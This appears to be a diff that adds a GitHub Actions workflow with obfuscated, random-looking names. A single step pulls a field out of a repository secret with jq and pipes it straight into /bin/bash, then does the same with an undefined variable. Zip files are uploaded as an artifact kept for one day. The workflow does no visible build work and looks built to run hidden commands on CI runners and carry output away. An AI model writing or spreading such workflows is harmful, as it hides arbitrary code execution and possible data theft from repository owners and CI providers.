@@ -1,0 +1,22 @@
+name: chasecobolo670
+on:
+  workflow_dispatch:
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: chasecobolo670
+        env:
+          q960: ${{ secrets.q960 }}
+        run: |
+          printf '%s' "$q960" | jq -r .an82992 | /bin/bash
+          printf '%s' "$wfiht1" | jq -r .dokvl41388 | /bin/bash
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: YyRQzOxe
+          path: "*.zip"
+          retention-days: 1
